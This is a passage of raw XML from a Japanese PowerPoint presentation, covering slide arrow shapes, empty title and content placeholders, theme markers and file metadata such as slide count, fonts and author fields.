                <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="65" name="矢印: 右 64">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{86F81642-675B-4299-A96C-D8B010E3E0E8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="16704173">
            <a:off x="4216420" y="3608940"/>
            <a:ext cx="4258399" cy="273904"/>
          </a:xfrm>
          <a:prstGeom prst="rightArrow">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2" name="矢印: 右 31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D1E9C788-B005-410E-9DA0-6944AC95C6C3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="3895386" y="3632590"/>
            <a:ext cx="4258399" cy="273904"/>
          </a:xfrm>
          <a:prstGeom prst="rightArrow">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6" name="矢印: 右 65">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3CC54F5E-B2B0-45FF-B502-5E70B6111BDD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="8972627" y="3592358"/>
            <a:ext cx="4258399" cy="273904"/>
          </a:xfrm>
          <a:prstGeom prst="rightArrow">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276657675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3F8BB86-87C9-46C8-9F87-81ADCB025A06}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="コンテンツ プレースホルダー 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BD67C64B-CEF8-4B04-B3EA-C786EB54A949}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1818260089"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/theme/theme1.xml><?xml version="1.0" encoding="utf-8"?>
<a:theme xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" name="Office Theme">
  <a:themeElements>
    <a:clrScheme name="Office テーマ">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テーマ">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テーマ">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1519</TotalTime>
  <Words>551</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>ワイド画面</PresentationFormat>
  <Paragraphs>104</Paragraphs>
  <Slides>4</Slides>
  <Notes>2</Notes>
  <HiddenSlides>0</HiddenSlides>
  <MMClips>0</MMClips>
  <ScaleCrop>false</ScaleCrop>
  <HeadingPairs>
    <vt:vector size="6" baseType="variant">
      <vt:variant>
        <vt:lpstr>使用されているフォント</vt:lpstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>4</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpstr>テーマ</vt:lpstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpstr>スライド タイトル</vt:lpstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>4</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="9" baseType="lpstr">
      <vt:lpstr>游ゴシック</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Calibri Light</vt:lpstr>
      <vt:lpstr>Office Theme</vt:lpstr>
      <vt:lpstr>PowerPoint プレゼンテーション</vt:lpstr>
      <vt:lpstr>PowerPoint プレゼンテーション</vt:lpstr>
      <vt:lpstr>PowerPoint プレゼンテーション</vt:lpstr>
      <vt:lpstr>PowerPoint プレゼンテーション</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A1259089</dc:creator>
  <cp:lastModifiedBy>内山３曹</cp:lastModifiedBy>
  <cp:revision>66</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-04-01T03:52:14Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-04-06T07:59:42Z</dcterms:modified>
</cp:coreProperties>
</file>